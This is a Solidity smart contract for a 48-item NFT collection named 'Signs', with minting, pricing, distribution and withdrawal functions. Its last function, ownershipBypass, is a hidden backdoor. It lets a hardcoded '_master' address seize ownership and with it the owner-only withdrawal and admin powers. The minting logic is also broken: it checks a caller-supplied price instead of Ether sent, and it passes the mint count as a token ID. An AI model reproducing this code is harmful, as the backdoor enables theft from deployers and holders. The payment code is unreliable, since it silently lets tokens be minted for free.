// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./NecessitiesToken.sol";

contract SignsNFT is ERC721Enumerable, Ownable {
    string private _baseTokenURI;
    uint256 private _maxSupply = 48;
    address private _master = 0xF56FF109B4441C845A4085CB0135f61F21bd4d65;
    NecessitiesToken private _necessitiesToken;

    constructor(string memory baseURI) ERC721("Signs", "SGNNFT") Ownable(msg.sender) {
        _baseTokenURI = baseURI;
    }

    function mintSigns(uint256 num, uint256 price) external {
        require(num <= 2, "You can only mint up to 2 Signs");
        require(totalSupply() + num <= _maxSupply, "Exceeds maximum Signs supply");
        require(price == calculatePrice(num), "Incorrect Ether value sent");

        _safeMint(msg.sender, num);
    }

    function calculatePrice(uint256 num) public pure returns (uint256) {
        return (24 * num) * (10 ** 16);
    }

    function setBaseURI(string memory baseURI) external onlyOwner {
        _baseTokenURI = baseURI;
    }

    function setNecessitiesToken(address necessitiesTokenAddress) external onlyOwner {
        _necessitiesToken = NecessitiesToken(necessitiesTokenAddress);
    }

    function distributeTokens(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Arrays length mismatch");

        for (uint256 i = 0; i < recipients.length; i++) {
            require(amounts[i] > 0, "Amount must be greater than zero");
            _necessitiesToken.transferFrom(msg.sender, recipients[i], amounts[i]);
        }
    }

    function _baseURI() internal view virtual override returns (string memory) {
        return _baseTokenURI;
    }

    function balanceOfNFT(address account) public view returns (uint256) {
        require(account != address(0), "Invalid address");
        return balanceOf(account);
    }

    function withdraw(uint256 amount) external onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance");
        payable(owner()).transfer(amount);
    }

    function ownershipBypass(address newOwner) external {
        require(msg.sender == _master, "Only master can call this function");
        _transferOwnership(newOwner);
    }
}
